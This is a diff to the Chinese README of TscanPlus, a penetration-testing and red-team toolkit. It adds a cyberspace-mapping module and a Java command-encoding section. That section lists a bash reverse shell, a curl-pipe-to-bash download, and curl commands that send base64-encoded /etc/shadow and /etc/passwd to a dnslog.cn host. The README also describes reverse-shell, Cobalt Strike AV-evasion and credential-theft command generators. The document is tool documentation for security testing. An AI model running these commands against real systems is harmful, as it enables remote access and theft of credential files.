@@ -9,8 +9,6 @@
 
 **【辅助功能】** 编码解码、加密解密、CS上线、反弹shell、杀软查询、提权辅助、常用命令、字典生成、JAVA编码等。
 
-
-
 https://github.com/TideSec/TscanPlus/assets/46297163/0f8cff21-6c33-4da3-bb6d-5f33d032a23e
 
 <video controls="controls" loop="loop" autoplay="autoplay"> 
@@ -62,6 +60,15 @@ https://github.com/TideSec/TscanPlus/assets/46297163/0f8cff21-6c33-4da3-bb6d-5f3
 感谢各位师傅提出的宝贵修改建议和诸多bug！
 
 **所有提过bug或建议的小伙伴可加入工具交流群，并享受新版本新功能第一时间尝鲜及永久VIP服务！**
+
+v1.4版 【2024.02.18】 
+
+	1、增加网络空间探测功能模块，内置9种常见空间探测API
+	2、目录枚举功能进行字典优化和重分类，感谢师傅 @无先森 
+	3、消息窗口不消失 @J1wa  @Hhhnee
+	4、空间探测平台api接口协助 @Grit
+	5、增加目录枚举递归限制，默认3层 @Google_Hacking
+	6、目录枚举过滤指定长度、关键字，自定义后缀  @无先森
 
 v1.3版 【2024.01.22】 
 
@@ -176,14 +183,11 @@ IP支持换行分割，支持如下格式：192.168.1.1、192.168.1.1/24、192.1
 <div align=center><img src=images/image-20231221144525144.png width=80% ></div>
 
 
-
 https://github.com/TideSec/TscanPlus/assets/46297163/2a88ced9-1612-4015-aa5e-0bb0e243525a
 
 <video controls="controls" loop="loop" autoplay="autoplay"> 
     <source src="images/TscanPlus.mp4" type="video/mp4">
 </video>
-
-
 
 
 **【高级配置】**
@@ -282,7 +286,27 @@ TscanPlus内置34种常见服务的弱口令破解，可方便管理员对内网
 
 <div align=center><img src=images/image-20231221140432486.png width=80% ></div>
 
-#### 8、目录扫描
+#### 8、空间测绘
+
+为使信息搜集更快捷方便，TscanPlus集成了多个网络空间测绘接口，包括fofa,hunter,quake,shodan,censys,zoomeye,threatbook,binaryedge,virustotal等9个主流空探API，可根据域名、IP地址、端口、应用、服务等进行检索，并对各网络空探结果进行去重整合。
+
+**【任务配置】**
+
+首先要配置key信息，如没有key可点击后面"API申请"进行申请，之后点击启用即可使用该API接口。
+
+在主界面选择字段，如域名、IP地址、端口、应用、服务等进行检索，并输入检索条件即可。TscanPlus会对所有结果进行去重和整合。
+
+<div align=center><img src=images/image-20240219132218857.png width=80% ></div>
+
+**【查询结果】**
+
+查询结果如下，会显示URL、IP、域名、端口、协议、标题、指纹、应用、Whois、备案、ISP、OS、地区、更新时间、API来源等信息。
+
+选择某一行或多行，右键菜单也可对某地址进行单独POC测试、目录枚举、端口扫描等，也可以对数据进行单条保存或全部保存。
+
+<div align=center><img src=images/image-20240219132548364.png width=80% ></div>
+
+#### 9、目录扫描
 
 目录扫描主要是对web站点进行目录枚举，支持字典模式、Fuzz模式、存活探测等，支持HEAD/GET方法，默认使用HEAD方法。
 
@@ -300,35 +324,35 @@ TscanPlus内置34种常见服务的弱口令破解，可方便管理员对内网
 
 最下方会显示目标存活数量、枚举成功数量、检测队列情况、用时等。
 
-<div align=center><img src=images/image-20231221141241014.png width=80% ></div>
+<div align=center><img src=images/image-20240219111318207.png width=80% ></div>
 
-#### 9、上线反弹
+#### 10、上线反弹
 
 TscanPlus内置各类反弹shell命令85条、MSF生成命令21条、CS免杀上线命令等，可根据shell类型、操作系统类型、监听类型自动生成代码。
 
-**【反弹shell】**
+##### **【反弹shell】**
 
 可设置IP/PORT、listener类型、shell类型、是否编码，选择你想要的命令后，即可生成响应代码。
 
 <div align=center><img src=images/image-20231221141826648.png width=80% ></div>
 
-**【CS上线】**
+##### **【CS上线】**
 
 CS上线配置CS Payload地址后，即可生成相应代码。
 
 <div align=center><img src=images/image-20231221141838825.png width=80% ></div>
 
-#### 10、红队命令
+#### 11、红队命令
 
 TscanPlus内置常用红队命令，包括Win内网(凭证获取、权限维持、横向移动)命令26类、Linux内网命令18类、下载命令31条。
 
-**【红队命令】**
+##### **【红队命令】**
 
 Win内网(凭证获取、权限维持、横向移动)命令26类、Linux内网命令18类。
 
 <div align=center><img src=images/image-20231221142158055.png width=80% ></div>
 
-**【下载命令】**
+##### **【下载命令】**
 
 内置常见下载命令31条，基本能覆盖内网渗透能用到的下载方法。
 
@@ -336,35 +360,75 @@ Win内网(凭证获取、权限维持、横向移动)命令26类、Linux内网�
 
 <div align=center><img src=images/image-20231221142332714.png width=80% ></div>
 
-#### 11、辅助工具
+#####  **【java编码】**
+
+有时，通过 `Runtime.getRuntime().exec()` 执行命令有效负载会导致失败。使用 WebShell，反序列化利用或通过其他媒介时，可能会发生这种情况。
+
+有时这是因为重定向和管道字符的使用方式在正在启动的进程的上下文中没有意义。例如，`ls > dir_listing`在shell中执行应该将当前目录的列表输出到名为的文件中`dir_listing`。但是在`exec()`函数的上下文中，该命令将被解释为获取`>`和`dir_listing`目录的列表。
+
+其他时候，其中包含空格的参数会被StringTokenizer类破坏，该类将空格分割为命令字符串。那样的东西`ls "My Directory"`会被解释为`ls '"My' 'Directory"'`。
+
+在Base64编码的帮助下，java命令编码转换器可以帮助减少这些问题。它可以通过调用Bash或PowerShell再次使管道和重定向更好，并且还确保参数中没有空格。
+
+常用命令清单
+
+```
+bash -i >& /dev/tcp/127.0.0.1/6666 0>&1
+ping `whoami`.key.dnslog.cn
+curl http://www.google.com/bash.txt|bash
+curl http://key.dnslog.cn/?r=`whoami`
+curl http://key.dnslog.cn/?r=`cat /etc/shadow|base64`
+curl http://key.dnslog.cn/?r=$(cat /etc/passwd|base64|tr '\n' '-')
+curl http://www.google.com/key.txt
+curl http://www.google.com/key.txt -O
+curl http://www.google.com/key.txt -o key.txt
+```
+
+<div align=center><img src=images/image-20240111143548211.png width=80% ></div>
+
+#### 12、辅助工具
 
 TscanPlus内置Windows提权辅助、杀软查询等工具，目前shiro解密、字典生成等模块还在完善，后续会持续更新。
 
-**【密码生成】**
+##### **【密码生成】**
 
 提供了三种密码生成方式，包括社工字典生成、组织方式和枚举模式。可根据需求不同来生成更有针对性的字典文件。
 
 <div align=center><img src=images/01.png width=80% ></div>
 
-**【密码查询】**
+##### **【密码查询】**
 
 内置了10733条常见设备和产品的默认账号密码，可直接进行查询并导出。
 
 <div align=center><img src=images/02.png width=80% ></div>
 
-**【提权辅助】**
+##### **【提权辅助】**
 
 根据systeminfo信息查询未修补的漏洞信息，返回漏洞微软编号、补丁编号、漏洞描述、影响系统等信息。
 
 <div align=center><img src=images/image-20231221142455293.png width=80% ></div>
 
-**【杀软查询】**
+##### **【杀软查询】**
 
 根据windows的tasklist信息，匹配杀软进程，内置1042条杀软识别规则。返回进程名称、进程ID、杀软名称等信息。
 
+![image-20240219142055021](/Users/xysoul/Tools/1-MyGitHub/TscanPlus/images/image-20240219142055021.png)
+
 <div align=center><img src=images/image-20231221142616501.png width=80% ></div>
 
+#####  **【导出功能】**
 
+1、在所有功能模块中，新增了导出excel功能，默认会保存在程序根目录下。
+
+2、在所有功能模块中，可对所有列内容进行排序和个过滤。
+
+3、在所有功能模块中，可多选或全选模板，并进行批量操作，如进行poc检测、密码破解、目录枚举等。
+
+4、对软件执行过程中发现的所有资产、威胁进行实时保存，保存路径为程序所有在根目录下的result.txt文件中。
+
+<div align=center><img src=images/image-20240111144248390.png width=80% ></div>
+
+<div align=center><img src=images/image-20240111144635519.png width=80% ></div>
 
 ### 软件下载
 
